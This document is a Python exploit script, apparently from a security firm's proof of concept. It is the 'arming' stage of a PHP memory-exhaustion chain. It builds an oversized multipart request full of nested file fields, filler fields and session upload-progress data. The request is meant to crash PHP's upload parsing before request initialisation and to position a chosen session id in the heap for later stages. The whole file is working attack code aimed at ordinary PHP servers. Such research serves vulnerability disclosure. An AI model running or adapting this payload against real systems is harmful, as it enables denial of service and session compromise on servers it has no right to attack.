#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""a1_arm.py - our own A1: the arming request for the pure-HTTP chain (mod_php, stock ini).

A1 has one job: make the request die inside RFC1867 processing (pre-RINIT), so the session
teardown and the multipart END event never run. Everything after that in the chain depends on the
state this leaves behind.

Shape (our implementation of the documented geometry, not an import):

  PHPSESSID                  a 32-hex session id - the multipart channel adopts it, but only if
                             the value uses session-id characters ([0-9a-f] at bits=4). A NUL byte
                             is rejected and PHP substitutes its own, measured in SID_ADOPTION.md.
  files[R%05d K*90][a]*62    860 empty-filename file fields, depth 64. The *unique* prefix per part
                             is what makes this an amplifier: each part builds its own chain of
                             nested arrays, and the deepest level gets the 7 $_FILES sub-keys.
  14 fillers                 103-byte names, 8-byte values (bin-128 zend_strings).
  78 x 8000 B, 20 x 4000 B   bulk fields that keep the heap close to the limit.
  PHP_SESSION_UPLOAD_PROGRESS  4000 bytes - this is what arms the session module pre-RINIT.

Sent with Transfer-Encoding: chunked so no Content-Length pre-check can refuse the body.

usage:
  a1_arm.py --url http://127.0.0.1:8130/ --repeat 3
"""
import argparse
import json
import socket
import sys

BOUNDARY = "C" * 10


def nest_name(i, depth, key_pad):
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def nested_part(i, depth, key_pad, b):
    """One nested file field, as a raw part header (the name is generated, not a value)."""
    if i == 0:
        ctype, filename = b"C" * 103, b"A"
    elif i == 1:
        ctype, filename = b"C" * 231, b"A"
    else:
        ctype, filename = b"application/octet-stream", b""
    return (b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" +
            nest_name(i, depth, key_pad) + b"\"; filename=\"" + filename + b"\"\r\n" +
            b"Content-Type: " + ctype + b"\r\n\r\n")


def build(parts, depth, key_pad, fillers, big, big_len, burners, burner_len,
          progress_len, sid_hex, progress_first=False, boundary=BOUNDARY, big_first=0,
          parts_first=0):
    b = boundary.encode()
    out = bytearray()

    def part(name, value=b"", filename=None, ctype=None):
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if ctype is not None:
            out.extend(b"Content-Type: " + ctype + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    # `big_first` large parts go out before PHPSESSID: the session id string is allocated when that
    # field is adopted, so parts already in the heap decide which page of the chunk it lands on.
    for i in range(min(big_first, big)):
        part(("b%04d" % i).encode(), b"B" * big_len)
    # Same idea with the nested parts: they are what actually grows the heap, so `parts_first` of
    # them decide which *chunk* the id lands in. A chunk other than heap->main_chunk is moved into
    # heap->cached_chunks at request shutdown and handed back with all 511 pages free.
    for i in range(min(parts_first, parts)):
        out.extend(nested_part(i, depth, key_pad, b))
    part(b"PHPSESSID", bytes.fromhex(sid_hex))
    if progress_first:
        # Arm the session while the heap still has room, so the decode succeeds and the id is set;
        # the OOM then comes later, outside php_session_decode's zend_catch, and PS(id) survives.
        part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    for i in range(parts):
        if i < min(parts_first, parts):
            continue
        out.extend(nested_part(i, depth, key_pad, b))
    for i in range(fillers):
        part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(max(0, big - big_first)):
        idx = i + min(big_first, big)
        part(("b%04d" % idx).encode(), b"B" * big_len)
    for i in range(burners):
        part(("u%02d" % i).encode(), b"U" * burner_len)
    if not progress_first:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out.extend(b"--" + b + b"--\r\n")
    return bytes(out)


def no_target(host, port, exc):
    """The one failure that is not a result: nothing is listening on that address."""
    return "no target on %s:%d (%s)" % (host, port, exc.strerror or exc)


def send_chunked(host, port, path, body, timeout=180.0, chunk=65536, extra_headers=""):
    head = ("POST %s HTTP/1.1\r\nHost: %s\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Transfer-Encoding: chunked\r\n%sConnection: close\r\n\r\n"
            % (path, host, BOUNDARY, extra_headers)).encode()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        return b"", no_target(host, port, exc)
    sock.settimeout(timeout)
    err = None
    try:
        sock.sendall(head)
        for off in range(0, len(body), chunk):
            piece = body[off:off + chunk]
            sock.sendall(("%x\r\n" % len(piece)).encode() + piece + b"\r\n")
        sock.sendall(b"0\r\n\r\n")
    except OSError as exc:                    # the worker may die mid-body: that is a result
        err = repr(exc)
    raw = b""
    try:
        while True:
            data = sock.recv(65536)
            if not data:
                break
            raw += data
    except OSError as exc:
        err = err or repr(exc)
    sock.close()
    return raw, err


def send_content_length(host, port, path, body, timeout=180.0, extra_headers=""):
    """The same request framed with Content-Length instead of chunked encoding.

    The difference matters at the memory limit: a chunked body has to be de-chunked, and the buffer that
    holds it can need a huge (>2 MiB) allocation of its own, which fails as `tried to allocate 2097152`
    before the multipart parser has finished. With Content-Length the body is read straight into the
    parser, so the failure can land where the chain needs it.
    """
    head = ("POST %s HTTP/1.1\r\nHost: %s\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Content-Length: %d\r\n%sConnection: close\r\n\r\n"
            % (path, host, BOUNDARY, len(body), extra_headers)).encode()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        return b"", no_target(host, port, exc)
    sock.settimeout(timeout)
    err = None
    try:
        sock.sendall(head + body)
    except OSError as exc:
        err = repr(exc)
    raw = b""
    try:
        while True:
            data = sock.recv(65536)
            if not data:
                break
            raw += data
    except OSError as exc:
        err = err or repr(exc)
    sock.close()
    return raw, err


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8130/")
    ap.add_argument("--sid-hex", default=None, help="32 hex chars; random when omitted")
    ap.add_argument("--parts", type=int, default=860)
    ap.add_argument("--depth", type=int, default=64)
    ap.add_argument("--key-pad", type=int, default=90)
    ap.add_argument("--fillers", type=int, default=14)
    ap.add_argument("--big", type=int, default=78)
    ap.add_argument("--big-len", type=int, default=8000)
    ap.add_argument("--burners", type=int, default=20)
    ap.add_argument("--burner-len", type=int, default=4000)
    ap.add_argument("--progress-len", type=int, default=4000)
    ap.add_argument("--repeat", type=int, default=1)
    ap.add_argument("--progress-first", action="store_true",
                    help="put PHP_SESSION_UPLOAD_PROGRESS right after PHPSESSID, so the session is "
                         "armed while the heap still has room and the OOM lands outside the decode")
    ap.add_argument("--big-first", type=int, default=0,
                    help="send N of the large parts before PHPSESSID, moving the session id "
                         "string higher up the chunk")
    ap.add_argument("--parts-first", type=int, default=0,
                    help="send N nested parts before PHPSESSID; they grow the heap fastest, so "
                         "the id is adopted in a later chunk")
    ap.add_argument("--query-n", type=int, default=0,
                    help="append N GET parameters: they are parsed during php_request_startup, "
                         "before module RINIT, so they move where the session id's small-bin page "
                         "is carved inside the chunk")
    ap.add_argument("--query-len", type=int, default=1000,
                    help="bytes per generated GET parameter value")
    ap.add_argument("--cookie-n", type=int, default=0,
                    help="send N cookies: $_COOKIE is built during php_request_startup, i.e. before "
                         "module RINIT, so this shifts where the session id's small-bin page is "
                         "carved inside the chunk")
    ap.add_argument("--cookie-len", type=int, default=8000,
                    help="bytes per generated cookie value")
    ap.add_argument("--timeout", type=float, default=180.0)
    ap.add_argument("--framing", choices=["chunked", "content-length"], default="chunked",
                    help="chunked needs a de-chunk buffer, which can fail as a huge allocation "
                         "before the parser finishes; content-length streams the body instead")
    args = ap.parse_args()

    import os
    rest = args.url.split("://", 1)[-1]
    hostport, _, path = rest.partition("/")
    host, _, port = hostport.partition(":")
    port = int(port or 80)
    path = "/" + path
    if args.query_n:
        # 8-character names with 1-byte values: the reference's calibration table (Ã‚Â§3) is measured
        # with `q0000000=v`, and the *name* length is what shifts the bin-40/bin-64 free-list heads.
        params = "&".join("q%07d=%s" % (i, "Q" * args.query_len) for i in range(args.query_n))
        path += ("&" if "?" in path else "?") + params
    extra = ""
    if args.cookie_n:
        # One Cookie header per cookie: Apache's LimitRequestFieldSize caps a single header line at
        # 8 KiB, but LimitRequestFields allows many lines.
        extra = "".join("Cookie: c%03d=%s\r\n" % (i, "C" * args.cookie_len)
                        for i in range(args.cookie_n))

    results = []
    for attempt in range(1, args.repeat + 1):
        sid = args.sid_hex or os.urandom(16).hex()
        body = build(args.parts, args.depth, args.key_pad, args.fillers, args.big,
                     args.big_len, args.burners, args.burner_len, args.progress_len, sid,
                     progress_first=args.progress_first, big_first=args.big_first,
                     parts_first=args.parts_first)
        if args.framing == "chunked":
            raw, err = send_chunked(host, port, path, body, args.timeout, extra_headers=extra)
        else:
            raw, err = send_content_length(host, port, path, body, args.timeout, extra_headers=extra)
        text = raw.decode("latin1", "replace")
        head, _, resp_body = text.partition("\r\n\r\n")
        lines = head.splitlines()
        cookies = [ln for ln in lines[1:] if ln.lower().startswith("set-cookie")]
        oom = "memory size" in resp_body
        results.append({
            "attempt": attempt,
            "sid": sid,
            "body_bytes": len(body),
            "status": lines[0] if lines else "",
            "resp_bytes": len(raw),
            "fatal_oom": oom,
            "fatal_text": (next((ln.strip() for ln in resp_body.splitlines() if "memory size" in ln), "")),
            "set_cookie": cookies,
            "sockerr": err,
        })
        r = results[-1]
        print("  attempt %d sid=%s body=%d -> %s  %d B  oom=%s%s"
              % (attempt, sid, len(body), r["status"], len(raw), oom,
                 "  cookie=" + cookies[0] if cookies else "  (no Set-Cookie: id adopted)"))
        if r["fatal_text"]:
            print("     ", r["fatal_text"][:160])
        if err:
            print("      socket:", err)
    print(json.dumps(results, indent=2) if args.repeat == 1 else "", end="")
    lost = next((r["sockerr"] for r in results
                 if (r["sockerr"] or "").startswith("no target on")), None)
    if lost:
        print(lost, file=sys.stderr)
        return 3
    return 0


if __name__ == "__main__":
    sys.exit(main())
